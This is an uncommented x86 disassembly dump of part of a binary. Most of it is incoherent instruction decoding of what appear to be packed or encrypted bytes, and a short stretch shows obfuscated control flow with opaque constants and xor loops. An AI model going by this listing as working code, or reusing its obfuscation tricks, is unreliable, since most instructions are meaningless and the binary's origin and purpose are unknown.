  40596c:	and    BYTE PTR [eax-0x106fd220],dl
  405972:	call   0x5a24:0xc66822fe
  405979:	aad    0x90
  40597b:	xchg   edi,eax
  40597c:	mov    eax,ds:0xc1da2f5
  405981:	adc    al,0x14
  405983:	xor    BYTE PTR [edi],ch
  405985:	jne    0x40593b
  405987:	js     0x4059e2
  405989:	outs   dx,DWORD PTR ds:[esi]
  40598a:	jmp    0x8629:0xe253e0ab
  405991:	dec    ebp
  405992:	sbb    bh,BYTE PTR ds:0x49b04926
  405998:	xchg   esi,eax
  405999:	adc    DWORD PTR [edx+0x5b],esi
  40599c:	sub    eax,0xd03aa587
  4059a1:	mul    DWORD PTR [eax+0x7b57c79b]
  4059a7:	js     0x40594d
  4059a9:	out    dx,eax
  4059aa:	aas    
  4059ab:	pop    eax
  4059ac:	xor    BYTE PTR ds:0x30f656e7,bh
  4059b2:	test   eax,0x47e81de2
  4059b7:	add    eax,0x19cc0eca
  4059bc:	in     eax,dx
  4059bd:	imul   edi,DWORD PTR [ebp-0x27],0x17687c76
  4059c4:	fs inc edi
  4059c6:	add    eax,0xdf382b47
  4059cb:	pushf  
  4059cc:	mov    ds:0xa95b547a,al
  4059d1:	xchg   ebp,eax
  4059d2:	or     ecx,DWORD PTR [edi]
  4059d4:	imul   ecx,edx,0xffffff88
  4059d7:	cs sbb ebx,0x636e8b2f
  4059de:	jle    0x4059e9
  4059e0:	inc    ebx
  4059e1:	and    esp,DWORD PTR [eax+eiz*2+0x68a2a96f]
  4059e8:	in     al,dx
  4059e9:	sbb    al,0x68
  4059eb:	test   BYTE PTR [edx],cl
  4059ed:	loope  0x405981
  4059ef:	in     eax,dx
  4059f0:	jp     0x405a60
  4059f2:	lahf   
  4059f3:	mov    bh,0x94
  4059f5:	xchg   edx,eax
  4059f6:	jmp    0x4059f5
  4059f8:	pop    ecx
  4059f9:	ficomp WORD PTR [ebx-0x31]
  4059fc:	mov    ah,0x1d
  4059fe:	sub    esi,DWORD PTR [ebp+0x6844efe]
  405a04:	clc    
  405a05:	ss mov edx,0x1d37c968
  405a0b:	jecxz  0x405a2c
  405a0d:	pop    esp
  405a0e:	in     al,dx
  405a0f:	in     eax,dx
  405a10:	scas   al,BYTE PTR es:[edi]
  405a11:	test   al,0xb5
  405a13:	fs (bad) 
  405a15:	jbe    0x405a79
  405a17:	lea    ebx,[ecx*8+0x7927a2c9]
  405a1e:	xchg   ebx,eax
  405a1f:	jns    0x4059c9
  405a21:	jnp    0x405a73
  405a23:	or     al,0x6d
  405a25:	jl     0x405a7e
  405a27:	lahf   
  405a28:	xor    al,0x8b
  405a2a:	inc    edx
  405a2b:	sbb    al,0xb1
  405a2d:	dec    esi
  405a2e:	xchg   ebx,eax
  405a2f:	fmul   st,st(4)
  405a31:	mov    ds:0xdd789879,al
  405a36:	clc    
  405a37:	jmp    0x4059b9
  405a39:	push   eax
  405a3a:	pop    es
  405a3b:	leave  
  405a3c:	or     bh,bl
  405a3e:	into   
  405a3f:	(bad)  
  405a40:	cmp    eax,0x3533b1b5
  405a45:	jle    0x405aa5
  405a47:	cmc    
  405a48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a49:	fwait
  405a4a:	std    
  405a4b:	popf   
  405a4c:	pop    es
  405a4d:	(bad)  
  405a4e:	or     eax,DWORD PTR [eax]
  405a50:	dec    ebp
  405a51:	jbe    0x405a1d
  405a53:	adc    edx,DWORD PTR [esi]
  405a55:	and    al,BYTE PTR [edi+0x4a21e00b]
  405a5b:	or     BYTE PTR [eax],dl
  405a5d:	imul   edi,DWORD PTR [ebx-0x1160b0b3],0xffffffcd
  405a64:	ja     0x405ad5
  405a66:	sub    eax,0x5117ffc6
  405a6b:	pop    ds
  405a6c:	retf   
  405a6d:	cmp    esi,0x1e34087c
  405a73:	dec    ebx
  405a74:	cwde   
  405a75:	aam    0x61
  405a77:	add    DWORD PTR ds:0xbc46f77f,ebp
  405a7d:	push   cs
  405a7e:	or     DWORD PTR ss:[ebx],edx
  405a81:	int3   
  405a82:	ins    BYTE PTR es:[edi],dx
  405a83:	(bad)  
  405a84:	popf   
  405a85:	test   BYTE PTR fs:[ecx-0x2523d8a0],0xf0
  405a8d:	test   DWORD PTR [esi+ebp*1],esi
  405a90:	push   ebx
  405a91:	xor    BYTE PTR [edx-0x21],ch
  405a94:	repz xchg esi,eax
  405a96:	cs (bad) 
  405a98:	repnz cmp ebx,edx
  405a9b:	jle    0x405a97
  405a9d:	outs   dx,BYTE PTR ds:[esi]
  405a9e:	loope  0x405b1b
  405aa0:	pop    esi
  405aa1:	add    al,0xdb
  405aa3:	ins    BYTE PTR es:[edi],dx
  405aa4:	jmp    0x322f6b88
  405aa9:	mov    WORD PTR [edx],fs
  405aab:	xchg   DWORD PTR [edx-0x768421a2],edi
  405ab1:	mov    ds:0xecc86d31,al
  405ab6:	mov    ecx,0xac01d80f
  405abb:	enter  0xaf25,0x84
  405abf:	xchg   esp,eax
  405ac0:	mov    cl,0xec
  405ac2:	xor    DWORD PTR [ecx-0xa],eax
  405ac5:	packsswb mm2,mm0
  405ac8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ac9:	cmp    DWORD PTR [ebx+eiz*8+0x6c1d6cac],ecx
  405ad0:	or     bl,bl
  405ad2:	mul    DWORD PTR [ebx]
  405ad4:	test   DWORD PTR [edi+0x52a25cb6],ebp
  405ada:	ds ja  0x405b10
  405add:	mov    eax,0x1a9cee14
  405ae2:	jle    0x405b2f
  405ae4:	xchg   edi,eax
  405ae5:	inc    edx
  405ae6:	inc    eax
  405ae7:	jbe    0x405b32
  405ae9:	push   eax
  405aea:	push   edx
  405aeb:	cmp    eax,0x3eee4072
  405af0:	ds cmp esi,0x1f1e9b8e
  405af7:	sbb    cl,cl
  405af9:	rcr    dh,cl
  405afb:	cmp    edi,DWORD PTR ds:0x918590b8
  405b01:	js     0x405b3f
  405b03:	jbe    0x405ab1
  405b05:	mov    ebx,0xb6a8e8be
  405b0a:	pop    esi
  405b0b:	retf   
  405b0c:	sub    BYTE PTR [ecx],0xc6
  405b0f:	aam    0x48
  405b11:	arpl   WORD PTR [ebx-0x7],sp
  405b14:	sub    ah,bl
  405b16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b17:	lods   eax,DWORD PTR ds:[esi]
  405b18:	into   
  405b19:	test   al,0x74
  405b1b:	mov    esp,0x6eb2b428
  405b20:	pop    si
  405b22:	push   ds
  405b23:	repnz inc ebp
  405b25:	ins    BYTE PTR es:[edi],dx
  405b26:	fs and ah,ch
  405b29:	in     al,dx
  405b2a:	hlt    
  405b2b:	or     ch,BYTE PTR ds:0x2c882ec7
  405b31:	lahf   
  405b32:	mov    DWORD PTR [ebp+0x10],ecx
  405b35:	mov    ecx,0xc6d
  405b3a:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  405b41:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  405b48:	mov    ecx,0xf89c8532
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43379b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x433753,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x4337a3,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x4337ef,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x43382f,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0xf3a6b5b1
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405b66
  405be0:	and    bh,BYTE PTR es:[eax]
  405be3:	pop    esi
  405be4:	inc    esi
  405be5:	xor    al,0xe0
  405be7:	pop    es
  405be8:	push   es
  405be9:	xchg   DWORD PTR [ecx+eax*2-0x43449759],edx
  405bf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bf1:	dec    BYTE PTR [edi-0x17517624]
  405bf7:	dec    ebp
  405bf8:	sub    ebx,ecx
  405bfa:	ficomp WORD PTR [ebp-0x13]
  405bfd:	add    BYTE PTR [ebx-0x4a5a2b99],dl
  405c03:	popa   
  405c04:	daa    
  405c05:	int3   
  405c06:	clc    
  405c07:	mov    ?,eax
  405c09:	mov    ds:0x973b8992,eax
  405c0e:	mov    esi,0x42a64610
  405c13:	push   ecx
  405c14:	ror    esp,0x6
  405c17:	mov    BYTE PTR [ebp-0x63],0xad
  405c1b:	or     al,0xf0
  405c1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c1e:	cmp    al,0xcc
  405c20:	icebp  
  405c21:	xor    bh,al
  405c23:	or     DWORD PTR [ecx-0x1a],ecx
  405c26:	dec    eax
  405c27:	pusha  
  405c28:	push   ecx
  405c29:	sub    ch,dh
  405c2b:	scas   eax,DWORD PTR es:[edi]
  405c2c:	lea    ecx,[ebx]
  405c2e:	leave  
  405c2f:	or     BYTE PTR [ebp+0x16f777c5],bh
  405c35:	test   DWORD PTR [eax-0x19],ecx
  405c38:	or     eax,0x6c348713
  405c3d:	and    DWORD PTR [edi-0x7f],ecx
  405c40:	dec    eax
  405c41:	shl    BYTE PTR [edi+0x48],cl
  405c44:	sub    edi,ebp
  405c46:	lods   al,BYTE PTR ds:[esi]
  405c47:	loopne 0x405bed
  405c49:	add    esp,ecx
  405c4b:	ss pop ebp
  405c4d:	aad    0xba
  405c4f:	jge    0x405c59
  405c51:	pop    es
  405c52:	daa    
  405c53:	xor    bl,dh
  405c55:	icebp  
  405c56:	xchg   edx,eax
  405c57:	mov    esp,0x110d28f0
  405c5c:	xchg   esi,eax
  405c5d:	popf   
  405c5e:	xor    dh,bh
  405c60:	(bad)  
  405c61:	out    0xe7,eax
  405c63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c64:	aaa    
  405c65:	add    eax,0x73a2ca6d
  405c6a:	inc    ebp
  405c6b:	push   0xf1f0fabd
  405c70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c71:	fdiv   st,st(6)
  405c73:	lods   al,BYTE PTR ds:[esi]
  405c74:	fild   DWORD PTR [ebp-0x535c568d]
  405c7a:	adc    bh,BYTE PTR [ebp-0x1a]
  405c7d:	push   esp
  405c7e:	pop    ebp
  405c7f:	out    0x84,eax
  405c81:	xor    eax,DWORD PTR [edx-0x5b8fcb75]
  405c87:	stos   DWORD PTR es:[edi],eax
  405c88:	inc    ebx
  405c89:	push   ebp
  405c8a:	fs dec ebp
  405c8c:	int3   
  405c8d:	mov    ecx,edx
  405c8f:	ins    BYTE PTR es:[edi],dx
  405c90:	jb     0x405c48
  405c92:	mov    edx,0x16e1643b
  405c97:	inc    esi
  405c98:	push   eax
  405c99:	add    eax,0xa271192d
  405c9e:	sub    eax,0xcbeacde2
  405ca3:	sbb    DWORD PTR [edi+ecx*8+0x32],ecx
  405ca7:	in     al,0xdd
  405ca9:	xchg   DWORD PTR [edx+ecx*1-0x1c],ebp
  405cad:	mov    ebx,DWORD PTR [ebp+0x45]
  405cb0:	outs   dx,BYTE PTR ds:[esi]
  405cb1:	add    eax,0x85a13e47
  405cb6:	adc    ch,bl
  405cb8:	dec    edi
  405cb9:	daa    
  405cba:	mov    esp,esp
  405cbc:	int    0xd2
  405cbe:	cmp    al,0x7
  405cc0:	aad    0x61
  405cc2:	dec    edx
  405cc3:	mov    dl,0x5e
  405cc5:	mov    al,ds:0x2196cb45
  405cca:	out    dx,eax
  405ccb:	mov    ds:0xc064c228,al
  405cd0:	cld    
  405cd1:	cld    
  405cd2:	js     0x405c69
  405cd4:	icebp  
  405cd5:	adc    dh,BYTE PTR [ebp+0x3]
  405cd8:	dec    esi
  405cd9:	or     bh,cl
  405cdb:	mov    ss,WORD PTR [eax]
  405cdd:	ror    BYTE PTR [ebp-0x4a],0x3d
  405ce1:	call   0x9ccb:0x8d8a83f1
  405ce8:	sub    ebp,DWORD PTR [edi-0x24]
  405ceb:	dec    esp
  405cec:	test   DWORD PTR [esi+edi*2+0x68],esp
  405cf0:	xor    BYTE PTR [eax*4-0x22266414],0x90
  405cf8:	jb     0x405d52
  405cfa:	or     ch,BYTE PTR [eax+0x0]
  405cfd:	inc    ebx
  405cfe:	push   esi
  405cff:	lods   al,BYTE PTR ds:[esi]
  405d00:	pop    edi
  405d01:	xor    al,0x7f
  405d03:	pop    ss
  405d04:	push   eax
  405d05:	sbb    dl,BYTE PTR [ecx+0x6d]
  405d08:	and    DWORD PTR [eax-0x267f32ac],ebp
  405d0e:	and    esi,DWORD PTR [ebp+0x3ff08b3b]
  405d14:	xchg   edi,eax
  405d15:	in     al,dx
  405d16:	into   
  405d17:	and    ebp,edi
  405d19:	xor    eax,0xb5ea8e5b
  405d1e:	call   0xd44a:0x1f893f7f
  405d25:	jge    0x405d79
  405d27:	shr    DWORD PTR [ecx-0x27],0xbf
  405d2b:	pop    ebx
  405d2c:	push   DWORD PTR [edi+ecx*1-0x6e8d4de4]
  405d33:	lods   eax,DWORD PTR ds:[esi]
  405d34:	nop
  405d35:	add    DWORD PTR [edx+ecx*1],edi
  405d38:	sub    BYTE PTR [ebp-0x5d1df859],0xb0
  405d3f:	inc    ecx
  405d40:	add    BYTE PTR [ebp-0x65e196b7],0x31
  405d47:	or     al,0x5f
  405d49:	clc    
  405d4a:	out    dx,eax
  405d4b:	popf   
  405d4c:	rcr    BYTE PTR [edi-0x1c],1
  405d4f:	repz sbb cl,BYTE PTR [esi]
  405d52:	shr    ah,1
  405d54:	call   0xf414:0x8191961a
  405d5b:	push   esi
  405d5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d5d:	ja     0x405cfb
  405d5f:	ins    DWORD PTR es:[edi],dx
  405d60:	inc    eax
  405d61:	fdiv   DWORD PTR [ebp+0x26]
  405d64:	mov    WORD PTR [esi],?
  405d66:	jle    0x405cea
  405d68:	lahf   
  405d69:	or     cl,BYTE PTR [eax]
  405d6b:	mov    BYTE PTR [esi-0x6d0e9d5f],ch
  405d71:	mov    fs,ebx
  405d73:	jns    0x405d90
  405d75:	mov    esp,0xc6bc1111
  405d7a:	mov    bl,0x61
  405d7c:	stos   BYTE PTR es:[edi],al
  405d7d:	(bad)  
  405d7e:	pop    eax
  405d7f:	ds mov edi,0x649ae6dd
  405d85:	mov    edx,0xac944553
  405d8a:	arpl   WORD PTR [edx+0x5f],di
  405d8d:	xlat   BYTE PTR ds:[ebx]
  405d8e:	sbb    eax,0xe2445131
  405d93:	int3   
  405d94:	fdivr  QWORD PTR [edx-0x6fecf5c5]
  405d9a:	fxch   st(2)
  405d9c:	inc    edi
  405d9d:	shr    DWORD PTR [edi+0x4138f66c],cl
  405da3:	jbe    0x405d5f
  405da5:	or     al,0x20
  405da7:	mov    ch,0x98
  405da9:	or     esp,DWORD PTR [edx-0x18]
  405dac:	inc    esp
  405dad:	lock and eax,0xf6d5ab0f
  405db3:	inc    ebp
  405db4:	sar    BYTE PTR [edx+0x79],0x14
  405db8:	inc    ecx
  405db9:	cmp    eax,0xe8e734fd
  405dbe:	test   BYTE PTR [ebx],bh
  405dc0:	in     eax,0x1
  405dc2:	mov    bl,0x49
  405dc4:	and    eax,0x8251bfd
  405dc9:	pop    esp
  405dca:	xor    al,0xc7
  405dcc:	lock lahf 
  405dce:	dec    ebp
  405dcf:	test   eax,0x861a7b25
  405dd4:	cvtpi2ps xmm1,mm5
  405dd7:	daa    
  405dd8:	repnz mov esp,0x102094ac
  405dde:	push   ebx
  405ddf:	adc    ebp,DWORD PTR [esi+0x66f2caec]
  405de5:	popf   
  405de6:	les    edi,FWORD PTR [ebx-0x22]
  405de9:	std    
  405dea:	into   
  405deb:	sar    DWORD PTR ds:0x52897ff1,0xe6
  405df2:	pop    ds
  405df3:	fidivr WORD PTR [edi]
  405df5:	fnstenv [eax+0x3a]
  405df8:	dec    esi
  405df9:	pop    ecx
  405dfa:	out    dx,eax
  405dfb:	fld    TBYTE PTR [esi+0x33]
  405dfe:	pop    esp
  405dff:	add    cl,BYTE PTR [edx]
  405e01:	les    ebx,FWORD PTR [eax-0x16]
  405e04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e05:	stos   DWORD PTR es:[edi],eax
  405e06:	rol    BYTE PTR [eax+edi*1-0x4d],1
  405e0a:	scas   eax,DWORD PTR es:[edi]
  405e0b:	retf   0xffba
  405e0e:	lods   eax,DWORD PTR ds:[esi]
  405e0f:	xor    cl,BYTE PTR [edx+0x5a]
  405e12:	mov    al,0xa5
  405e14:	xor    al,0x46
  405e16:	adc    edi,DWORD PTR [ebx-0x46f8e599]
  405e1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e1d:	stos   DWORD PTR es:[edi],eax
  405e1e:	mov    ebp,0x25f8f7a9
  405e23:	ror    BYTE PTR [esi+0x5b],0x72
  405e27:	popf   
  405e28:	adc    ebp,0x466c0a43
  405e2e:	in     eax,0x1d
  405e30:	in     al,0xb6
  405e32:	jg     0x405e89
  405e34:	xchg   esi,eax
  405e35:	into   
  405e36:	xchg   edi,eax
  405e37:	sub    al,0x61
  405e39:	dec    eax
  405e3a:	mov    BYTE PTR [eax],0x5b
  405e3d:	and    DWORD PTR [ecx+esi*8-0x2c65b758],edx
  405e44:	mov    eax,ds:0xe9947bb4
  405e49:	push   0xea2e9a76
  405e4e:	lds    edx,FWORD PTR [ebx]
  405e50:	or     DWORD PTR [edi],esp
  405e52:	cli    
  405e53:	stos   BYTE PTR es:[edi],al
  405e54:	fnstcw WORD PTR [edi]
  405e56:	gs add al,0x1d
  405e59:	sub    ebp,DWORD PTR [ecx-0x7b]
  405e5c:	imul   ebp,DWORD PTR [ebx],0xffffffd6
  405e5f:	std    
  405e60:	cs mov esi,edx
  405e63:	fnstsw WORD PTR [edi+0x6e20c6d7]
  405e69:	cli    
  405e6a:	ss mov eax,0x8436786
  405e70:	sub    BYTE PTR [edx],cl
  405e72:	sar    BYTE PTR [ecx],0xeb
  405e75:	lahf   
  405e76:	adc    DWORD PTR [eax-0x2d6dfb63],edi
  405e7c:	add    eax,0x4bab3e14
  405e81:	retf   0x70ea
  405e84:	mov    ecx,0xef469f43
  405e89:	imul   ebp,DWORD PTR [edx+0x3d33a52],0x8fd2b84a
  405e93:	mov    DWORD PTR [edx+0x10b4c6c9],edx
  405e99:	rcr    BYTE PTR [eax-0x12],1
  405e9c:	fwait
  405e9d:	loop   0x405f11
  405e9f:	leave  
  405ea0:	call   0x264f:0x9f0dddf9
  405ea7:	push   ebp
  405ea8:	dec    ebx
  405ea9:	sub    al,0x42
  405eab:	xor    eax,0xd2b1a7a2
  405eb0:	jle    0x405eff
  405eb2:	and    eax,0xbefdcbe7
  405eb7:	icebp  
  405eb8:	daa    
  405eb9:	ret    
  405eba:	out    dx,eax
  405ebb:	pop    ds
  405ebc:	arpl   WORD PTR [esi],di
  405ebe:	ror    eax,1
  405ec0:	dec    edi
  405ec1:	popa   
  405ec2:	out    dx,eax
  405ec3:	sbb    al,0x69
  405ec5:	pop    ds
  405ec6:	push   ecx
  405ec7:	in     al,dx
  405ec8:	loopne 0x405f31
  405eca:	int    0x2a
  405ecc:	dec    ebx
  405ecd:	outs   dx,BYTE PTR ds:[esi]
  405ece:	sub    al,0x37
  405ed0:	dec    edi
  405ed1:	add    DWORD PTR [edx],edx
  405ed3:	xchg   edx,eax
  405ed4:	mov    ah,0xbb
  405ed6:	ficomp WORD PTR [edi]
  405ed8:	not    BYTE PTR [ebx-0x77]
  405edb:	pusha  
  405edc:	xchg   ecx,esi
  405ede:	retf   
  405edf:	mov    ch,BYTE PTR [ebp-0x29add1ba]
  405ee5:	scas   eax,DWORD PTR es:[edi]
  405ee6:	inc    ecx
  405ee7:	and    DWORD PTR [ebx-0x40],ebp
  405eea:	stos   DWORD PTR es:[edi],eax
  405eeb:	mov    ds:0xb5f3214b,eax
  405ef0:	ret    
  405ef1:	hlt    
  405ef2:	mov    ds:0xf3cbab37,al
  405ef7:	sub    al,dl
  405ef9:	cmp    DWORD PTR [edx],edi
  405efb:	dec    esp
  405efc:	mov    edi,0xe540d95
  405f01:	xchg   ebx,eax
  405f02:	push   0x4d3f84c2
  405f07:	ds dec esi
  405f09:	push   edx
  405f0a:	cmc    
  405f0b:	cmp    DWORD PTR [ebp-0x16],ebx
  405f0e:	sub    ch,BYTE PTR [ecx-0x80ecc4c]
  405f14:	fldl2t 
  405f16:	dec    edx
  405f17:	add    eax,DWORD PTR [eax]
  405f19:	add    BYTE PTR [ebp-0x2e],dh
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    WORD PTR [ecx+edx*4],cs
  405f28:	mov    ebp,0x7e30a69b
  405f2d:	jle    0x405f5b
  405f2f:	jge    0x405faf
  405f31:	jle    0x405f70
  405f33:	xlat   BYTE PTR ds:[ebx]
  405f34:	aas    
  405f35:	cmp    DWORD PTR [edx-0x3b],ebx
  405f38:	add    eax,0xf722a489
  405f3d:	ds add al,bh
  405f40:	cmc    
  405f41:	dec    esi
  405f42:	sbb    edi,DWORD PTR [ebx-0x7b995beb]
  405f48:	popa   
  405f49:	loop   0x405f21
  405f4b:	test   bl,cl
  405f4d:	(bad)  
  405f4f:	pop    edx
  405f50:	xchg   esp,eax
  405f51:	(bad)  [esi+0xf4d2341]
  405f57:	fsubr  QWORD PTR [eax+0x49088cf8]
  405f5d:	nop
  405f5e:	xchg   ebx,eax
  405f5f:	cmc    
  405f60:	push   0x70
  405f62:	mov    ds:0x8879caa5,eax
  405f67:	ror    ecx,0x3b
  405f6a:	lea    esp,[esi]
  405f6c:	sub    BYTE PTR [ebp-0x2],bh
  405f6f:	push   ebx
  405f70:	dec    ebx
  405f71:	pop    esp
  405f72:	pop    edi
  405f73:	aaa    
  405f74:	nop
  405f75:	adc    cl,al
  405f77:	cdq    
  405f78:	test   DWORD PTR [edi],eax
  405f7a:	cmp    BYTE PTR [esi+0x78],al
  405f7d:	add    ecx,ecx
  405f7f:	jb     0x405f14
  405f81:	mov    eax,ds:0x8edf590b
  405f86:	loopne 0x405fd6
  405f88:	gs (bad) 
  405f8a:	adc    ah,bl
  405f8c:	pop    es
  405f8d:	sub    ebp,DWORD PTR [esi]
  405f8f:	je     0x405ff7
  405f91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f92:	sbb    esi,edi
  405f94:	out    0x6b,eax
  405f96:	sub    dh,BYTE PTR [edi+esi*2]
  405f99:	jle    0x406006
  405f9b:	call   0x7477:0x4ea5e37c
  405fa2:	std    
  405fa3:	inc    edx
  405fa4:	push   edx
  405fa5:	mov    ah,BYTE PTR [ebx]
  405fa7:	adc    eax,0x45cef89f
  405fac:	mov    edx,0x3eb8197d
  405fb1:	ror    esi,1
  405fb3:	outs   dx,DWORD PTR ds:[esi]
  405fb4:	cs das 
  405fb6:	mov    bl,0x6
  405fb8:	dec    ebx
  405fb9:	pop    eax
  405fba:	in     al,0xb1
  405fbc:	(bad)  
  405fbd:	mov    ebx,0x2ad395d8
  405fc2:	lods   eax,DWORD PTR ds:[esi]
  405fc3:	sbb    al,0xc
  405fc5:	pop    ss
  405fc6:	loopne 0x405f4e
  405fc8:	cwde   
  405fc9:	pop    ss
  405fca:	fnstsw WORD PTR [ebx+eiz*4]
  405fcd:	iret   
  405fce:	pop    esi
  405fcf:	inc    ebp
  405fd0:	pop    ecx
  405fd1:	dec    ecx
  405fd2:	xchg   esp,eax
  405fd3:	aam    0x8d
  405fd5:	sahf   
  405fd6:	push   cs
  405fd7:	push   edi
  405fd8:	or     cl,BYTE PTR [edi+0x49]
  405fdb:	jmp    0x110c:0x6b5cff21
  405fe2:	xchg   ebp,eax
  405fe3:	add    eax,0x8e784890
  405fe8:	test   edx,eax
  405fea:	fadd   st(4),st
  405fec:	jl     0x406020
  405fee:	scas   al,BYTE PTR es:[edi]
  405fef:	repz cmp eax,0x603e8212
  405ff5:	inc    edx
  405ff6:	dec    DWORD PTR [ebp-0x3b321402]
  405ffc:	fcomp  DWORD PTR [eax+0x71de1fda]
  406002:	adc    ebp,esi
  406004:	and    esi,ebx
  406006:	jnp    0x405fab
  406008:	fistp  WORD PTR [edi-0x5d]
  40600b:	sbb    al,0x8
  40600d:	fs faddp st(0),st
  406010:	adc    al,0xb4
  406012:	paddq  mm1,QWORD PTR [ebx+0x78]
  406016:	scas   eax,DWORD PTR es:[edi]
  406017:	cs jnp 0x405ffc
  40601a:	xor    al,0x2e
  40601c:	ja     0x406017
  40601e:	or     ecx,DWORD PTR [ecx+0x6d]
  406021:	xchg   ebp,eax
  406022:	fidiv  DWORD PTR [esi]
  406024:	test   BYTE PTR [edi+0x17],ah
  406027:	xlat   BYTE PTR ds:[ebx]
  406028:	adc    ch,BYTE PTR [ecx]
  40602a:	ror    DWORD PTR [edx+0x21],cl
  40602d:	fiadd  WORD PTR [ecx+edx*8]
  406030:	shl    BYTE PTR ds:0xf2c66f2f,0x2a
  406037:	jp     0x40609d
  406039:	leave  
  40603a:	jo     0x406034
  40603c:	les    esi,FWORD PTR [eax-0x78]
  40603f:	cmp    ecx,DWORD PTR [edi]
  406041:	(bad)  
  406042:	pop    es
  406043:	mov    ecx,0x2bddcb58
  406048:	cmp    al,0xf0
  40604a:	push   esi
  40604b:	ins    DWORD PTR es:[edi],dx
  40604c:	push   edx
  40604d:	jmp    0xddea:0xaee3143b
  406054:	xor    esp,DWORD PTR [ecx-0x54b38fd1]
  40605a:	mov    dh,0x15
  40605c:	adc    eax,0xf425c2a8
  406061:	adc    DWORD PTR [edx],ecx
  406063:	mov    gs,WORD PTR [ecx]
  406065:	loopne 0x406035
  406067:	mov    edx,0x1f0e34a4
  40606c:	in     eax,dx
  40606d:	(bad)  
  40606e:	dec    BYTE PTR [ebp+0x47]
  406071:	in     al,0x1c
  406073:	and    al,0xfe
  406075:	jp     0x4060f5
  406077:	inc    ecx
  406078:	das    
  406079:	dec    edi
  40607a:	push   esp
  40607b:	xchg   esi,eax
  40607c:	outs   dx,DWORD PTR ds:[esi]
  40607d:	mov    ebx,0x34cb7dc0
  406082:	jne    0x406039
  406084:	in     eax,0x47
  406086:	loopne 0x406068
  406088:	fiadd  DWORD PTR [edi+0x40]
  40608b:	cs pop ds
  40608d:	fild   DWORD PTR [edi-0x1d264d08]
  406093:	and    ah,dl
  406095:	addr16 jl 0x406099
  406098:	shl    BYTE PTR [esp+eax*2-0x53],cl
  40609c:	aad    0x8b
  40609e:	jo     0x406074
  4060a0:	repnz inc ebp
  4060a2:	mov    ds:0x59f650f2,eax
  4060a7:	inc    edx
  4060a8:	jmp    FWORD PTR [eax+ecx*2-0x31]
  4060ac:	cwde   
  4060ad:	stos   BYTE PTR es:[edi],al
  4060ae:	sbb    BYTE PTR [eax-0x5a],bl
  4060b1:	sub    BYTE PTR [esi],al
  4060b3:	pop    ebp
  4060b4:	imul   esp,DWORD PTR [ecx],0x3b3c82e7
  4060ba:	stc    
  4060bb:	mov    edx,0xfdc2cbbf
  4060c0:	cmp    ecx,edi
  4060c2:	icebp  
  4060c3:	fld    TBYTE PTR [edx-0x3f9a739c]
  4060c9:	and    al,0x23
  4060cb:	jl     0x406090
  4060cd:	push   ecx
  4060ce:	out    dx,eax
  4060cf:	mov    bh,0x8c
  4060d1:	mov    cl,0xc5
  4060d3:	cmc    
  4060d4:	push   eax
  4060d5:	mov    ecx,0xf810f966
  4060da:	loop   0x4060aa
  4060dc:	or     ebx,DWORD PTR [edi+0x7953a3b]
  4060e2:	pop    ebx
  4060e3:	inc    esp
  4060e4:	ret    0xab0b
  4060e7:	mov    eax,0x4700291
  4060ec:	adc    eax,0x757561fd
  4060f1:	idiv   BYTE PTR [edi+ebx*1]
  4060f4:	xlat   BYTE PTR ds:[ebx]
  4060f5:	out    0x2b,al
  4060f7:	xchg   ebp,eax
  4060f8:	adc    edi,esi
  4060fa:	cdq    
  4060fb:	es add dl,al
  4060fe:	add    al,0x2c
  406100:	cmp    DWORD PTR [ecx+0x791ecedb],esp
  406106:	mov    DWORD PTR [ecx-0x30f8e2f2],0x7b9d59ce
  406110:	js     0x4060ec
  406112:	outs   dx,DWORD PTR ds:[esi]
  406113:	fld    QWORD PTR [edx-0x16]
  406116:	loopne 0x4060fd
  406118:	mov    ebx,0x4b3f7210
  40611d:	jl     0x406183
  40611f:	pop    ss
  406120:	sub    BYTE PTR [ebx+0x12],ch
  406123:	xchg   ecx,ecx
  406125:	or     dh,ah
  406127:	stos   DWORD PTR es:[edi],eax
  406128:	repnz sub eax,0x5ad7b2cd
  40612e:	test   DWORD PTR [edi],0xba9fd1d7
  406134:	cmovg  esp,DWORD PTR [eax-0x902429d]
  40613b:	mov    al,ds:0x156fcd3f
  406140:	mov    ch,0x2c
  406142:	fmul   DWORD PTR [ecx]
  406144:	add    BYTE PTR [edx+0x2a086031],dh
